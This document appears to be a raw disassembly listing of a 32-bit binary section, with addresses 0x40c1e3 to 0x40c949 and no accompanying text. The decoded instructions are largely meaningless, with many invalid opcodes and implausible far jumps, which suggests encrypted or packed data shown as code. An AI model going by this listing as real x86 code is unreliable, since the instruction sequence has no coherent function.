  40c1e3:	lods   al,BYTE PTR ds:[esi]
  40c1e4:	sbb    BYTE PTR [ebp*2+0x737012f3],al
  40c1eb:	int    0x68
  40c1ed:	pop    edx
  40c1ee:	icebp  
  40c1ef:	xchg   ecx,eax
  40c1f0:	aam    0x5a
  40c1f2:	and    bh,al
  40c1f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f5:	test   al,0xa7
  40c1f7:	pop    ebp
  40c1f8:	add    eax,0xd92079de
  40c1fd:	in     al,0x7e
  40c1ff:	ja     0x40c1c4
  40c201:	lods   al,BYTE PTR ds:[esi]
  40c202:	maskmovq mm6,(bad)
  40c203:	div    DWORD PTR [ecx+0x5314a605]
  40c209:	pop    eax
  40c20a:	ja     0x40c26f
  40c20c:	lock push 0x57
  40c20f:	pusha  
  40c210:	mov    ah,0x72
  40c212:	sub    ah,BYTE PTR ds:0xabd90339
  40c218:	aaa    
  40c219:	fsub   st(3),st
  40c21b:	lea    ecx,[edx-0x662cb831]
  40c221:	mov    bh,0x5c
  40c223:	hlt    
  40c224:	push   ds
  40c225:	sub    bl,BYTE PTR [ebx+0x9]
  40c228:	push   cs
  40c229:	es jle 0x40c29a
  40c22c:	loope  0x40c252
  40c22e:	dec    esp
  40c22f:	add    eax,0x1ee3dc06
  40c234:	loopne 0x40c1bb
  40c236:	shr    ebp,0xf5
  40c239:	and    al,0xd7
  40c23b:	inc    eax
  40c23c:	dec    edi
  40c23d:	test   eax,0x745f7023
  40c242:	mov    esp,cs
  40c244:	dec    ebp
  40c245:	stc    
  40c246:	aaa    
  40c247:	push   esi
  40c248:	jge    0x40c2a8
  40c24a:	cld    
  40c24b:	test   al,0x13
  40c24d:	jno    0x40c260
  40c24f:	jne    0x40c22e
  40c251:	ins    DWORD PTR es:[edi],dx
  40c252:	call   0x3fcd:0x78ffaa17
  40c259:	stc    
  40c25a:	pushf  
  40c25b:	sti    
  40c25c:	imul   esi,ecx,0xfffffff6
  40c25f:	ret    
  40c260:	adc    ebx,ebp
  40c262:	lods   al,BYTE PTR ds:[esi]
  40c263:	pop    edi
  40c264:	mov    BYTE PTR [eax+edi*8],al
  40c267:	in     eax,0x12
  40c269:	jle    0x40c2e8
  40c26b:	lds    eax,FWORD PTR [eax]
  40c26d:	pushf  
  40c26e:	jo     0x40c2a9
  40c270:	mov    al,ds:0x7b07bb00
  40c275:	cmp    ah,BYTE PTR [edx-0x46]
  40c278:	xchg   ebp,eax
  40c279:	sar    DWORD PTR [edx+0x78fff245],cl
  40c27f:	adc    DWORD PTR [esi],edx
  40c281:	mov    esp,0x32d20eef
  40c286:	or     al,0xf5
  40c288:	push   ecx
  40c289:	addr16 int 0x46
  40c28c:	loop   0x40c2f2
  40c28e:	(bad)  
  40c28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c290:	adc    DWORD PTR [edx-0x50],ebx
  40c293:	int3   
  40c294:	adc    esp,DWORD PTR [ebx-0x6e]
  40c297:	out    dx,al
  40c298:	jmp    0xee925da0
  40c29d:	retf   
  40c29e:	call   0x6032:0x526755b9
  40c2a5:	aas    
  40c2a6:	sub    ecx,DWORD PTR [eax]
  40c2a8:	cwde   
  40c2a9:	xlat   BYTE PTR ds:[ebx]
  40c2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2ab:	mov    eax,0x2c7a2496
  40c2b0:	fneni(8087 only) 
  40c2b2:	mov    edi,0x12c06676
  40c2b7:	sbb    eax,0x8dbcb27c
  40c2bc:	and    eax,0x220acaaf
  40c2c1:	cwde   
  40c2c2:	into   
  40c2c3:	arpl   WORD PTR [edi+edx*8],si
  40c2c6:	push   ss
  40c2c7:	adc    BYTE PTR [edx+0x58],ch
  40c2ca:	xor    BYTE PTR [eax+ecx*2-0x39],ch
  40c2ce:	or     al,0xc6
  40c2d0:	xor    DWORD PTR [di+0x58],ebx
  40c2d4:	daa    
  40c2d5:	mov    al,ds:0xf8623b7b
  40c2da:	adc    DWORD PTR [ebx-0x21e8a532],eax
  40c2e0:	repnz out 0xb6,eax
  40c2e3:	ins    DWORD PTR es:[edi],dx
  40c2e4:	ficomp DWORD PTR [eax]
  40c2e6:	xchg   ebp,eax
  40c2e7:	mov    al,BYTE PTR [ebp-0x4b]
  40c2ea:	inc    bl
  40c2ec:	out    0xb5,eax
  40c2ee:	sub    edi,esi
  40c2f0:	cmp    DWORD PTR [eax-0x3c87bf94],0xe85537bf
  40c2fa:	aaa    
  40c2fb:	inc    esi
  40c2fc:	dec    eax
  40c2fd:	mov    al,ds:0x488e155b
  40c302:	push   cs
  40c303:	push   esi
  40c304:	pop    esi
  40c305:	in     al,0xd2
  40c307:	shl    DWORD PTR [esi+0x2d0bbb35],0xb0
  40c30e:	into   
  40c30f:	mov    ah,0xe4
  40c311:	pusha  
  40c312:	enter  0xbd26,0xb
  40c316:	add    al,0xa7
  40c318:	std    
  40c319:	jae    0x40c311
  40c31b:	mov    cl,bh
  40c31d:	mov    ds:0x7a1beeda,al
  40c322:	ror    DWORD PTR [edi-0xd],1
  40c325:	xor    ch,BYTE PTR [eax+0x70ee210b]
  40c32b:	dec    ebp
  40c32c:	cs jge 0x40c38c
  40c32f:	fcmovnu st,st(4)
  40c331:	loop   0x40c349
  40c333:	sbb    DWORD PTR [eax+0x540b74fb],edi
  40c339:	adc    ebp,ecx
  40c33b:	inc    eax
  40c33c:	cli    
  40c33d:	leave  
  40c33e:	in     eax,dx
  40c33f:	push   esi
  40c340:	(bad)  
  40c341:	scas   al,BYTE PTR es:[edi]
  40c342:	push   ds
  40c343:	pusha  
  40c344:	sti    
  40c345:	imul   ecx,edx,0xe50c938a
  40c34b:	sub    DWORD PTR [edx],ebp
  40c34d:	dec    edi
  40c34e:	adc    eax,0x52b3fec1
  40c353:	pop    ebp
  40c354:	dec    ebx
  40c355:	mov    esi,0x1e02ed8c
  40c35a:	mov    ecx,0x3e274627
  40c35f:	repnz leave 
  40c361:	cmp    al,0xba
  40c363:	out    dx,al
  40c364:	adc    ah,BYTE PTR [ecx]
  40c366:	fwait
  40c367:	aaa    
  40c368:	pop    ecx
  40c369:	adc    eax,0x2ac3af56
  40c36e:	rol    BYTE PTR [ebx+0x7ef9b7e8],cl
  40c374:	scas   eax,DWORD PTR es:[edi]
  40c375:	push   ds
  40c376:	jle    0x40c324
  40c378:	or     cl,BYTE PTR [ebp-0x16]
  40c37b:	or     BYTE PTR [edi+0xe851314],dl
  40c381:	mov    ch,BYTE PTR [edi-0x6b]
  40c384:	pop    esi
  40c385:	in     al,dx
  40c386:	or     ebx,DWORD PTR [eax]
  40c388:	js     0x40c380
  40c38a:	push   ebp
  40c38b:	dec    ebx
  40c38c:	push   eax
  40c38d:	mov    edi,0xecac70f9
  40c392:	cmp    al,BYTE PTR [edx]
  40c394:	jp     0x40c385
  40c396:	inc    ebp
  40c397:	lock pop ecx
  40c399:	inc    edx
  40c39a:	push   esp
  40c39b:	xchg   ebx,eax
  40c39c:	jnp    0x40c3ae
  40c39e:	mov    WORD PTR [edi-0xc],ds
  40c3a1:	mov    ds:0x5331aa5f,eax
  40c3a6:	adc    dh,BYTE PTR [ebp+0x1e5d9d5e]
  40c3ac:	mov    ds:0x1686bfc1,eax
  40c3b1:	popf   
  40c3b2:	cmc    
  40c3b3:	inc    ebp
  40c3b4:	adc    ebp,DWORD PTR [eax-0x5318298c]
  40c3ba:	mov    edi,0x6568a4eb
  40c3bf:	cdq    
  40c3c0:	xchg   edi,eax
  40c3c1:	out    dx,eax
  40c3c2:	les    ecx,FWORD PTR [esi-0x63bdda27]
  40c3c8:	jmp    0x40c386
  40c3ca:	pop    ds
  40c3cb:	shl    BYTE PTR [esi+0x68],cl
  40c3ce:	and    esp,DWORD PTR [edx+0x24]
  40c3d1:	in     al,dx
  40c3d2:	mov    eax,ds:0x2bc541d2
  40c3d7:	pop    ecx
  40c3d8:	sbb    ch,BYTE PTR [edi]
  40c3da:	adc    dl,0xa5
  40c3dd:	sub    BYTE PTR [eax],dh
  40c3df:	ins    DWORD PTR es:[edi],dx
  40c3e0:	pop    edx
  40c3e1:	cmp    al,0xe7
  40c3e3:	add    eax,0xa19fbef9
  40c3e8:	es std 
  40c3ea:	xchg   edi,eax
  40c3eb:	xchg   ecx,eax
  40c3ec:	mov    dl,0x62
  40c3ee:	or     eax,0x2bbf6527
  40c3f3:	mov    esp,0x40b7bf42
  40c3f8:	shr    DWORD PTR [eax-0x2c],cl
  40c3fb:	push   eax
  40c3fc:	add    dl,BYTE PTR [esi+0x440e4162]
  40c402:	fidiv  WORD PTR [esp+edi*4+0x26]
  40c406:	xchg   edx,eax
  40c407:	xchg   esi,eax
  40c408:	(bad)  
  40c409:	mov    eax,0x246eb359
  40c40e:	mov    bl,0x17
  40c410:	xor    bl,0x93
  40c413:	sbb    DWORD PTR [edi+0x3c],ebp
  40c416:	sbb    eax,0xa59a9a10
  40c41b:	shr    BYTE PTR [edi+0x60b318ef],1
  40c421:	xchg   ebp,eax
  40c422:	mov    ch,0x26
  40c424:	test   al,0xd3
  40c426:	cmp    BYTE PTR [edx+0x22669382],0x1c
  40c42d:	scas   al,BYTE PTR es:[edi]
  40c42e:	out    dx,eax
  40c42f:	xor    ecx,DWORD PTR [eax+edx*8+0x3627e7d2]
  40c436:	and    bh,bl
  40c438:	xchg   ebx,eax
  40c439:	outs   dx,BYTE PTR ds:[esi]
  40c43a:	adc    al,0xdb
  40c43c:	jns    0x40c3cd
  40c43e:	out    0x59,al
  40c440:	aad    0x87
  40c442:	pushf  
  40c443:	arpl   bp,bp
  40c445:	lods   al,BYTE PTR ds:[esi]
  40c446:	pop    ebx
  40c447:	ja     0x40c43e
  40c449:	dec    eax
  40c44a:	jl     0x40c3ec
  40c44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c44d:	pop    ebx
  40c44e:	xor    edi,DWORD PTR [bx+di]
  40c451:	(bad)  
  40c452:	jmp    0x146de040
  40c457:	rcl    DWORD PTR [ebp-0x4302aa3a],1
  40c45d:	mov    ebp,0x972cb68a
  40c462:	add    DWORD PTR [ecx-0x3ade1972],eax
  40c468:	ss stos DWORD PTR es:[edi],eax
  40c46a:	imul   ecx,DWORD PTR [ecx+edx*8+0x78bd155a],0xc9743b41
  40c475:	push   ecx
  40c476:	mul    edx
  40c478:	inc    ebx
  40c479:	jb     0x40c4a4
  40c47b:	cmp    ebp,DWORD PTR [eax+0x63]
  40c47e:	add    eax,0x34bf3c6
  40c483:	(bad)  
  40c484:	fidiv  DWORD PTR [ebx]
  40c486:	dec    edx
  40c487:	sbb    DWORD PTR ds:0x6140adbf,esi
  40c48d:	jp     0x40c435
  40c48f:	aaa    
  40c490:	stos   DWORD PTR es:[edi],eax
  40c491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c492:	push   edx
  40c493:	jmp    0x7c9f:0x54cf9210
  40c49a:	mov    ecx,0xea63ffbc
  40c49f:	mov    dl,0x76
  40c4a1:	ret    0x9240
  40c4a4:	aad    0x49
  40c4a6:	clc    
  40c4a7:	jle    0x40c49e
  40c4a9:	dec    ebx
  40c4aa:	fistp  QWORD PTR [edi]
  40c4ac:	cmp    DWORD PTR [edx-0x4a],ebp
  40c4af:	adc    al,0x1f
  40c4b1:	mov    ah,0x5
  40c4b3:	adc    al,0x75
  40c4b5:	cmp    ch,al
  40c4b7:	dec    DWORD PTR [ecx]
  40c4b9:	rcl    DWORD PTR [edx+0x5d],0x30
  40c4bd:	sahf   
  40c4be:	or     eax,0x986dad6e
  40c4c3:	sub    bl,dl
  40c4c5:	fisub  WORD PTR [edi-0x63]
  40c4c8:	loope  0x40c49f
  40c4ca:	push   ecx
  40c4cb:	pop    ecx
  40c4cc:	aaa    
  40c4cd:	iret   
  40c4ce:	xchg   esp,eax
  40c4cf:	mov    DWORD PTR [ebp+0x7e],ebp
  40c4d2:	(bad)  
  40c4d3:	minps  xmm4,XMMWORD PTR [ecx+0x44]
  40c4d7:	shr    BYTE PTR [eax],cl
  40c4d9:	xor    al,ch
  40c4db:	mov    esi,DWORD PTR [ebx-0x7]
  40c4de:	(bad)  
  40c4df:	shl    DWORD PTR [eax+0x3d],cl
  40c4e2:	jns    0x40c46f
  40c4e4:	inc    edx
  40c4e5:	push   esi
  40c4e6:	jno    0x40c49d
  40c4e8:	rol    BYTE PTR [ebx+ebx*2-0x17c61659],0xe1
  40c4f0:	push   esp
  40c4f1:	mov    esi,ebx
  40c4f3:	cmp    al,0x1c
  40c4f5:	lahf   
  40c4f6:	xor    al,0xbe
  40c4f8:	mov    dh,0x6a
  40c4fa:	ffreep st(0)
  40c4fc:	jmp    0x40c547
  40c4fe:	sub    bh,BYTE PTR [esi+0x14]
  40c501:	mov    esi,0xf9206e0e
  40c506:	lds    esp,FWORD PTR [ebp-0xc4cc8a6]
  40c50c:	inc    ax
  40c50e:	xchg   ebp,eax
  40c50f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c510:	jo     0x40c539
  40c512:	lods   eax,DWORD PTR ds:[esi]
  40c513:	adc    dl,BYTE PTR [ecx]
  40c515:	lock out 0x45,al
  40c518:	lock pause 
  40c51b:	jne    0x40c547
  40c51d:	outs   dx,DWORD PTR ds:[esi]
  40c51e:	jne    0x40c59e
  40c520:	addr16 std 
  40c522:	mov    al,0x9b
  40c524:	mov    esp,0x69451388
  40c529:	push   ebp
  40c52a:	mov    esp,ecx
  40c52c:	xor    eax,0xe54fad79
  40c531:	sbb    al,0x10
  40c533:	or     BYTE PTR [ecx],al
  40c535:	aam    0xd
  40c537:	rcl    ebx,1
  40c539:	scas   al,BYTE PTR es:[edi]
  40c53a:	inc    edx
  40c53b:	addr16 repz pop ecx
  40c53e:	fs sub dl,ah
  40c541:	jmp    0xa132:0x9cc06df0
  40c548:	add    eax,0xafbc2e50
  40c54d:	jmp    0x8976:0x9c663b2c
  40c554:	dec    esi
  40c555:	aad    0xd4
  40c557:	xor    BYTE PTR [ebx-0x60],ah
  40c55a:	ret    
  40c55b:	mov    dl,0x2f
  40c55d:	push   ebp
  40c55e:	and    eax,0xf8b1b2f5
  40c563:	cmp    ch,BYTE PTR [eax+0x5d]
  40c566:	(bad)  
  40c567:	imul   BYTE PTR [ecx+0x7]
  40c56a:	sti    
  40c56b:	cmp    bl,dh
  40c56d:	dec    esp
  40c56e:	xor    DWORD PTR [eax+0x34f4f652],ebp
  40c574:	(bad)  
  40c575:	xor    BYTE PTR [ebx+0x683fd709],al
  40c57b:	in     eax,0x9
  40c57d:	mov    ds:0xe9327be5,eax
  40c582:	call   0x2e70:0x34f645c5
  40c589:	cli    
  40c58a:	mov    ds:0xfcb1be54,eax
  40c58f:	outs   dx,DWORD PTR ds:[esi]
  40c590:	ds mov dl,cl
  40c593:	and    BYTE PTR [edx-0x627b141],bl
  40c599:	cmp    ebp,eax
  40c59b:	scas   al,BYTE PTR es:[edi]
  40c59c:	das    
  40c59d:	pop    edi
  40c59e:	dec    esp
  40c59f:	push   cs
  40c5a0:	adc    al,0x7a
  40c5a2:	cs (bad) 
  40c5a4:	xchg   ecx,eax
  40c5a5:	imul   edx,esi,0xffffff88
  40c5a8:	cld    
  40c5a9:	outs   dx,BYTE PTR ds:[esi]
  40c5aa:	fcom   st(7)
  40c5ac:	out    dx,al
  40c5ad:	inc    edi
  40c5ae:	in     al,dx
  40c5af:	pop    ds
  40c5b0:	xchg   esi,eax
  40c5b1:	in     eax,dx
  40c5b2:	push   ds
  40c5b3:	rcl    esp,cl
  40c5b5:	outs   dx,BYTE PTR ds:[esi]
  40c5b6:	xchg   DWORD PTR [edi+0x45],ecx
  40c5b9:	sahf   
  40c5ba:	sbb    ebp,0xffffffcf
  40c5bd:	and    edx,DWORD PTR [ebp-0xe]
  40c5c0:	data16 sbb dh,ah
  40c5c3:	nop
  40c5c4:	fbld   TBYTE PTR [eax-0x48d91cb3]
  40c5ca:	inc    esi
  40c5cb:	(bad)  [ebp-0x37]
  40c5ce:	out    0xa,al
  40c5d0:	stos   BYTE PTR es:[edi],al
  40c5d1:	popf   
  40c5d2:	sub    al,0xe9
  40c5d4:	xor    al,0x53
  40c5d6:	adc    BYTE PTR [esp+ebx*2-0x6a],dl
  40c5da:	(bad)  
  40c5db:	out    dx,eax
  40c5dc:	loop   0x40c625
  40c5de:	jp     0x40c5a8
  40c5e0:	test   BYTE PTR [ecx-0x4f],0xb7
  40c5e4:	xchg   ebp,eax
  40c5e5:	fs test eax,0x3a26bd3f
  40c5eb:	sbb    al,BYTE PTR [edx]
  40c5ed:	push   ss
  40c5ee:	adc    eax,0x6a46f7e8
  40c5f3:	add    ecx,DWORD PTR [esp+ebx*1]
  40c5f6:	in     eax,dx
  40c5f7:	jne    0x40c5be
  40c5f9:	imul   ebx,DWORD PTR [edx],0xfffffff1
  40c5fc:	xor    eax,DWORD PTR ds:0xb4036c16
  40c602:	cmp    eax,0x8bd59dc9
  40c607:	push   eax
  40c608:	popa   
  40c609:	xchg   dh,bl
  40c60b:	mov    ds:0x8f20cb3f,al
  40c610:	inc    edx
  40c611:	xchg   ecx,eax
  40c612:	sub    al,0x35
  40c614:	xor    eax,0x69e9de01
  40c619:	mov    esp,0xa6b5a1f9
  40c61e:	movnti DWORD PTR [ecx-0x2a],esp
  40c622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c623:	add    BYTE PTR [ebx+0x4],al
  40c626:	(bad)  
  40c627:	pop    ecx
  40c628:	jp     0x40c61e
  40c62a:	jbe    0x40c678
  40c62c:	xchg   ecx,eax
  40c62d:	call   0xfe0efdd0
  40c632:	retf   
  40c633:	pop    ss
  40c634:	cmp    al,0xc5
  40c636:	clc    
  40c637:	push   ebp
  40c638:	(bad)  
  40c639:	cwde   
  40c63a:	inc    ecx
  40c63b:	mov    DWORD PTR [ebp+0x4b9000d9],esi
  40c641:	adc    al,0xe9
  40c643:	add    BYTE PTR [ecx-0x3f],bh
  40c646:	(bad)  
  40c649:	(bad)  [ebx-0x66b1cfa6]
  40c64f:	jo     0x40c687
  40c651:	fidivr WORD PTR [eax+0x20]
  40c654:	adc    al,0x3d
  40c656:	(bad)  
  40c657:	pushf  
  40c658:	mov    ch,0xb2
  40c65a:	jp     0x40c69d
  40c65c:	jne    0x40c6c9
  40c65e:	push   cs
  40c65f:	cmp    ecx,eax
  40c661:	cmp    esp,ebp
  40c663:	adc    al,0x29
  40c665:	repz mov ah,0x2a
  40c668:	rol    BYTE PTR [eax+0x33],0x52
  40c66c:	inc    eax
  40c66d:	loop   0x40c618
  40c66f:	xor    al,0x22
  40c671:	or     edx,edx
  40c673:	dec    ecx
  40c674:	les    edx,FWORD PTR [ebx-0x20]
  40c677:	inc    esi
  40c678:	mov    eax,ds:0x400237fe
  40c67d:	push   ds
  40c67e:	imul   esi,DWORD PTR [eax],0x1b7f8aaf
  40c684:	enter  0x1bb,0x60
  40c688:	pop    ebp
  40c689:	sub    al,BYTE PTR [ebp+0x63]
  40c68c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c68d:	ins    BYTE PTR es:[edi],dx
  40c68e:	gs inc edx
  40c690:	stos   BYTE PTR es:[edi],al
  40c691:	daa    
  40c692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c693:	cmc    
  40c694:	pusha  
  40c695:	mov    bl,0x9f
  40c697:	add    cl,BYTE PTR [esi]
  40c699:	loopne 0x40c6a8
  40c69b:	jmp    0x40c650
  40c69d:	inc    ebp
  40c69e:	inc    eax
  40c69f:	aas    
  40c6a0:	shl    ecx,0x30
  40c6a3:	(bad)  [ebp+0x28a56e68]
  40c6a9:	aam    0x5d
  40c6ab:	adc    edx,DWORD PTR [edx+edi*8-0x42]
  40c6af:	outs   dx,BYTE PTR ds:[esi]
  40c6b0:	mov    eax,ds:0xcb3e90ff
  40c6b5:	or     eax,0xee41c7f2
  40c6ba:	sub    eax,0x98a41a8d
  40c6bf:	aam    0xb6
  40c6c1:	jne    0x40c65f
  40c6c3:	add    BYTE PTR [edi],bl
  40c6c5:	adc    esp,0xc4bd4f98
  40c6cb:	dec    ebp
  40c6cc:	in     al,dx
  40c6cd:	leave  
  40c6ce:	fbstp  TBYTE PTR [ebx-0x344a6bf2]
  40c6d4:	cmc    
  40c6d5:	push   esp
  40c6d6:	ds pop es
  40c6d8:	push   edi
  40c6d9:	adc    eax,0x9b656f10
  40c6de:	dec    eax
  40c6df:	sbb    eax,0x4463b8eb
  40c6e4:	ja     0x40c67b
  40c6e6:	stos   BYTE PTR es:[edi],al
  40c6e7:	aaa    
  40c6e8:	mov    ds:0x2e38aa69,eax
  40c6ed:	push   ebp
  40c6ee:	gs lock and al,0x17
  40c6f2:	shr    ecx,cl
  40c6f4:	mov    ds:0x89c13403,eax
  40c6f9:	xchg   ecx,eax
  40c6fa:	int    0x90
  40c6fc:	fldln2 
  40c6fe:	pop    edx
  40c6ff:	daa    
  40c700:	mov    esi,0xefb7282
  40c705:	jle    0x40c6c1
  40c707:	adc    BYTE PTR [eax+0x561c87fd],ch
  40c70d:	cmp    ebx,DWORD PTR [edx]
  40c70f:	mov    ds:0x2f84a4e7,eax
  40c714:	or     BYTE PTR [esi-0x41f76e53],0x3f
  40c71b:	popa   
  40c71c:	loopne 0x40c71a
  40c71e:	mov    WORD PTR [esi-0x6d],cs
  40c721:	inc    eax
  40c722:	int3   
  40c723:	add    DWORD PTR [ecx+0x4a16501c],0xe1a48924
  40c72d:	or     DWORD PTR [edi+0x44546e0c],ebx
  40c733:	rcr    edi,1
  40c735:	pop    eax
  40c736:	call   0x66b9:0x61b2be
  40c73d:	mov    DWORD PTR [edx+edx*8],esp
  40c740:	pop    esp
  40c741:	test   al,0x88
  40c743:	sub    DWORD PTR [eax+0x3c245cc0],eax
  40c749:	add    al,0x7b
  40c74b:	retf   0xc01d
  40c74e:	mov    eax,ds:0x6a42d18
  40c753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c754:	dec    ecx
  40c755:	aad    0xff
  40c757:	gs es inc esi
  40c75a:	std    
  40c75b:	pop    ss
  40c75c:	jno    0x40c75e
  40c75e:	ins    DWORD PTR es:[edi],dx
  40c75f:	xlat   BYTE PTR ds:[ebx]
  40c760:	cli    
  40c761:	fbld   TBYTE PTR [ebp+0x42]
  40c764:	aad    0x3c
  40c766:	cmp    eax,DWORD PTR [ecx+eiz*8-0x135e25ff]
  40c76d:	addr16 inc edi
  40c76f:	popa   
  40c770:	addr16 fwait
  40c772:	inc    ecx
  40c773:	dec    esi
  40c774:	ins    DWORD PTR es:[edi],dx
  40c775:	sbb    DWORD PTR [ecx+0x6f5a715e],0x77018037
  40c77f:	mov    cl,0x50
  40c781:	add    ah,al
  40c783:	or     BYTE PTR [edx+0x6555bd1f],cl
  40c789:	push   ecx
  40c78a:	xchg   BYTE PTR [eiz*4+0x7937ca61],dl
  40c791:	pop    esp
  40c792:	pusha  
  40c793:	push   edx
  40c794:	xchg   ecx,eax
  40c795:	sub    ebp,ecx
  40c797:	shl    BYTE PTR [ebx*1-0x2b97f582],1
  40c79e:	hlt    
  40c79f:	and    al,0x30
  40c7a1:	retf   0x4321
  40c7a4:	mov    DWORD PTR [ecx+0x49],esp
  40c7a7:	sub    BYTE PTR [esi-0x4e],bl
  40c7aa:	(bad)  
  40c7ab:	daa    
  40c7ac:	es mov dl,0xbb
  40c7af:	jecxz  0x40c746
  40c7b1:	xchg   BYTE PTR [ebx],ch
  40c7b3:	adc    al,0xc1
  40c7b5:	xchg   ebx,eax
  40c7b6:	aam    0x69
  40c7b8:	jl     0x40c746
  40c7ba:	in     eax,dx
  40c7bb:	or     DWORD PTR [ebp+0x3622677e],0xffffffb1
  40c7c2:	aas    
  40c7c3:	push   edx
  40c7c4:	fsubr  st,st(0)
  40c7c6:	push   ebx
  40c7c7:	jecxz  0x40c7ca
  40c7c9:	adc    eax,0xc503c255
  40c7ce:	bound  ebx,QWORD PTR [edi-0x41]
  40c7d1:	fidiv  DWORD PTR [ebx]
  40c7d3:	push   ds
  40c7d4:	fsubrp st(3),st
  40c7d6:	jne    0x40c7e6
  40c7d8:	cmp    al,0xde
  40c7da:	imul   esp,DWORD PTR [edi+0x5b97a89],0x245294e9
  40c7e4:	fistp  DWORD PTR [ebp-0x52]
  40c7e7:	pop    es
  40c7e8:	aas    
  40c7e9:	cmp    BYTE PTR ds:0xff88ba8b,ah
  40c7ef:	mov    cl,0xd5
  40c7f1:	or     esp,ebp
  40c7f3:	cs add bh,BYTE PTR cs:[ebp+esi*4+0x5d]
  40c7f9:	out    0x3b,eax
  40c7fb:	sub    esp,esi
  40c7fd:	in     al,dx
  40c7fe:	dec    eax
  40c7ff:	ss mov ebp,0xb2d6a861
  40c805:	pop    edi
  40c806:	dec    esp
  40c807:	and    ch,BYTE PTR [ebp-0x5d]
  40c80a:	mov    ecx,0x894cd5c4
  40c80f:	data16 mov bh,0x39
  40c812:	sub    eax,ecx
  40c814:	sub    eax,esp
  40c816:	or     cl,BYTE PTR [ebp+0x34b2048]
  40c81c:	stc    
  40c81d:	pop    esp
  40c81e:	in     al,dx
  40c81f:	out    0x2c,eax
  40c821:	pop    ebp
  40c822:	out    dx,al
  40c823:	push   edx
  40c824:	inc    esi
  40c825:	cmp    BYTE PTR [esi-0x46],ah
  40c828:	imul   esp,ebx,0x43
  40c82b:	xor    al,0xe5
  40c82d:	pop    esp
  40c82e:	inc    ebx
  40c82f:	fadd   DWORD PTR [ebp-0x2b3c6ffd]
  40c835:	jae    0x40c7fd
  40c837:	push   eax
  40c838:	jmp    0x50f1:0x28e8529b
  40c83f:	jmp    0xdfc80ec7
  40c844:	jnp    0x40c80e
  40c846:	jmp    DWORD PTR [ebp+0x5f]
  40c849:	adc    DWORD PTR [ebp-0x7e],ebp
  40c84c:	or     BYTE PTR [ecx-0x57],ah
  40c84f:	mov    ds:0x6d46583f,al
  40c854:	mov    al,ds:0x5b738ab
  40c859:	clc    
  40c85a:	rol    DWORD PTR [edi-0x681697ff],cl
  40c860:	jb     0x40c854
  40c862:	lods   al,BYTE PTR ds:[esi]
  40c863:	jne    0x40c866
  40c865:	or     esp,DWORD PTR [ebp-0x741d7b31]
  40c86b:	jae    0x40c841
  40c86d:	lods   eax,DWORD PTR ds:[esi]
  40c86e:	ja     0x40c8c2
  40c870:	cmc    
  40c871:	dec    ecx
  40c872:	sbb    al,0xde
  40c874:	mov    ecx,0x1a19d183
  40c879:	xor    ah,BYTE PTR [esi]
  40c87b:	or     BYTE PTR [ebp+0x7f],bl
  40c87e:	adc    DWORD PTR [eax-0x2f],esp
  40c881:	push   ecx
  40c882:	dec    ebp
  40c883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c884:	fsubr  QWORD PTR [edi-0x62]
  40c887:	add    eax,0x76
  40c88a:	cdq    
  40c88b:	mov    DWORD PTR [esi+edx*8],esi
  40c88e:	mov    bl,0x58
  40c890:	jns    0x40c8b5
  40c892:	out    dx,al
  40c893:	lahf   
  40c894:	mov    esp,0x800dfe5d
  40c899:	cmp    DWORD PTR [edi+0x35115992],eax
  40c89f:	cmp    bl,BYTE PTR [eax]
  40c8a1:	test   eax,0x363acb23
  40c8a6:	adc    ebx,DWORD PTR [eax]
  40c8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8a9:	in     eax,dx
  40c8aa:	adc    cl,BYTE PTR [esi+0x3]
  40c8ad:	dec    esp
  40c8ae:	pop    ebp
  40c8af:	and    bh,BYTE PTR [eax+0x25e16a7a]
  40c8b5:	aam    0x7d
  40c8b7:	fidivr WORD PTR [ecx]
  40c8b9:	dec    ebp
  40c8ba:	xchg   edx,eax
  40c8bb:	pop    es
  40c8bc:	pop    esp
  40c8bd:	mov    ebx,0xc5e419fa
  40c8c2:	int3   
  40c8c3:	enter  0xfaf8,0xfe
  40c8c7:	or     DWORD PTR [edi],0x4d993f6e
  40c8cd:	mov    esp,eax
  40c8cf:	and    DWORD PTR ds:0x9b2272f2,0x9088db3
  40c8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8da:	xchg   ebx,eax
  40c8db:	(bad)  
  40c8dc:	call   0x76f6:0x952bf2ab
  40c8e3:	push   esi
  40c8e4:	mov    edx,0x15725434
  40c8e9:	cld    
  40c8ea:	lock test DWORD PTR [ebx-0x34a2af95],esi
  40c8f1:	arpl   si,ax
  40c8f3:	mov    esi,?
  40c8f5:	pop    eax
  40c8f6:	pushf  
  40c8f7:	cmp    BYTE PTR [eax-0x6f8346b1],al
  40c8fd:	fs jg  0x40c8de
  40c900:	mov    WORD PTR [esi+ebx*4+0x5a4d7e15],?
  40c907:	call   0x271b:0x419718ce
  40c90e:	or     DWORD PTR [edi-0x32],esi
  40c911:	mov    ds:0x1bb1efd8,eax
  40c916:	call   0xda1b1e31
  40c91b:	jbe    0x40c906
  40c91d:	mov    al,ds:0x447c9460
  40c922:	repnz std 
  40c924:	adc    DWORD PTR [edi+0x4c],edx
  40c927:	or     bh,ch
  40c929:	inc    ebp
  40c92a:	nop
  40c92b:	addr16 push cs
  40c92d:	test   DWORD PTR [edi-0x34],ebx
  40c930:	ins    DWORD PTR es:[edi],dx
  40c931:	in     al,dx
  40c932:	add    DWORD PTR [eax],esp
  40c934:	add    bh,BYTE PTR [ebx+0x14022a49]
  40c93a:	aaa    
  40c93b:	xchg   ebp,eax
  40c93c:	pusha  
  40c93d:	and    BYTE PTR [esi],dl
  40c93f:	push   ds
  40c940:	push   eax
  40c941:	mov    ecx,0x3af7844a
  40c946:	push   edi
  40c947:	popf   
  40c948:	lods   eax,DWORD PTR ds:[esi]
  40c949:	call   0x568b:0x7f919bc6
